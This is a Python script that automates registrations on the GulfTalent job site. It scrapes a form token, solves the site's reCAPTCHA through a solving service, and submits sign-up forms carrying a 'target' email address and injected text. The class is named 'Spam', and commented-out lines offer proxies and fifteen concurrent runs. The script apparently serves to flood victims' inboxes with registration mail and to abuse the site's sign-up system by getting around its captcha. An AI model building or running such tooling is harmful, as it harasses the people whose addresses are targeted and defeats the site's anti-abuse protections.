import re
from os.path import basename

import requests

import module
from module import Spam


def get(session: requests.Session):
    headers = {
        'authority': 'www.gulftalent.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'referer': 'https://www.gulftalent.com/Register',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        'x-gt-client': 'www.gulftalent.com v2.190.0',
        'x-newrelic-id': 'VQYDU1BRCxAHUllSAAgH',
    }

    params = {
        'reg_path': 'join',
    }

    response = session.get(
        'https://www.gulftalent.com/_partials/registrationFormModal',
        params=params,
        headers=headers, timeout=10
    )
    return response


def post(session, token, captcha, target, text):
    headers = {
        'authority': 'www.gulftalent.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarytA7D0lhj3S2rISU7',
        # 'cookie': '_fbp=fb.1.1676888690630.1942300860; __utmc=81319553; __utmz=81319553.1676888691.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _ga=GA1.2.813448190.1676888691; _gid=GA1.2.1258316534.1676888693; referer_tracking=%7B%22landing_page%22%3A%22%5C%2F_partials%5C%2FregistrationOptionsModal%22%2C%22referer_url%22%3A%22https%3A%5C%2F%5C%2Fwww.gulftalent.com%5C%2FRegister%22%2C%22referer_domain%22%3A%22www.gulftalent.com%22%2C%22referer_type%22%3A%22WEBPAGE%22%2C%22landing_page_type%22%3A%22OTHER%22%2C%22mailshot%22%3Anull%2C%22sys_email%22%3Anull%7D; usertype=default; PHPSESSID=d058e29de6762f59083430e986bdd038; __utma=81319553.813448190.1676888691.1676888691.1676890990.2; __utmt=1; G_ENABLED_IDPS=google; __utmb=81319553.2.9.1676891047332',
        'origin': 'https://www.gulftalent.com',
        'referer': 'https://www.gulftalent.com/register',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }

    data = '------WebKitFormBoundarytA7D0lhj3S2rISU7\r\nContent-Disposition: form-data; name="candidate[firstname]"\r\n\r\ntest\r\n' \
           '------WebKitFormBoundarytA7D0lhj3S2rISU7\r\nContent-Disposition: form-data; name="candidate[surname]"\r\n\r\ntest\r\n' \
           '------WebKitFormBoundarytA7D0lhj3S2rISU7\r\nContent-Disposition: form-data; name="candidate[CanLoc_location_current]"\r\n\r\n90999301000000\r\n' \
           '------WebKitFormBoundarytA7D0lhj3S2rISU7\r\nContent-Disposition: form-data; name="candidate[curr_jobpos]"\r\n\r\nRPA Developer\r\n' \
           '------WebKitFormBoundarytA7D0lhj3S2rISU7\r\nContent-Disposition: form-data; name="candidate[username]"\r\n\r\nwezxasqw+awd123@gmail.com\r\n' \
           '------WebKitFormBoundarytA7D0lhj3S2rISU7\r\nContent-Disposition: form-data; name="candidate[plainPassword]"\r\n\r\nLnJpJZE7yyhfW86\r\n' \
           '------WebKitFormBoundarytA7D0lhj3S2rISU7\r\nContent-Disposition: form-data; name="candidate[cv_file]"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n' \
           '------WebKitFormBoundarytA7D0lhj3S2rISU7\r\nContent-Disposition: form-data; name="facebook_id"\r\n\r\n\r\n' \
           '------WebKitFormBoundarytA7D0lhj3S2rISU7\r\nContent-Disposition: form-data; name="google_id"\r\n\r\n\r\n' \
           '------WebKitFormBoundarytA7D0lhj3S2rISU7\r\nContent-Disposition: form-data; name="registration_path"\r\n\r\njoin\r\n' \
           '------WebKitFormBoundarytA7D0lhj3S2rISU7\r\nContent-Disposition: form-data; name="mailing[MailpoolPermissionTypeTwo]"\r\n\r\nYES\r\n' \
           '------WebKitFormBoundarytA7D0lhj3S2rISU7\r\nContent-Disposition: form-data; name="mailing[MailpoolPermissionTypeThree]"\r\n\r\nYES\r\n' \
           '------WebKitFormBoundarytA7D0lhj3S2rISU7\r\nContent-Disposition: form-data; name="mailing[_token]"\r\n\r\nmailing_token\r\n' \
           '------WebKitFormBoundarytA7D0lhj3S2rISU7--\r\n'

    data = data.replace('mailing_token', token)
    data = data.replace('cap_que', captcha)
    data = data.replace('wezxasqw+test@gmail.com', target)
    data = data.replace('test', text)

    response = session.post('https://www.gulftalent.com/register', headers=headers, data=data.encode(), timeout=10)
    return response


pattern = re.compile('(?<=value=").*(?=" />)')
googlekey = '6LdvaRMUAAAAABmNpTxDJWdHL5DqqxOdNgmvOPX9'
pageurl = 'https://www.gulftalent.com/register'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        s = requests.Session()
        # s.proxies = self.get_proxies()
        get_resp = get(s)
        if not get_resp.ok:
            self.logger.info(get_resp)
            return
        token = pattern.findall(get_resp.text)
        if not token:
            self.logger.info(get_resp.text)
            self.logger.info(token)
            return
        captcha = self.solve_captcha(pageurl, googlekey, version='v3')
        if not captcha:
            return
        post_resp = post(s, token[-1], captcha, target, self.get_text())
        return post_resp


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), 'Please fill out your personal information')
    res = spam.send_post(f'wezxasqw+{module.generate_text()}@gmail.com')
    # if res:
    #     spam.run_concurrently(15)


if __name__ == '__main__':
    main()
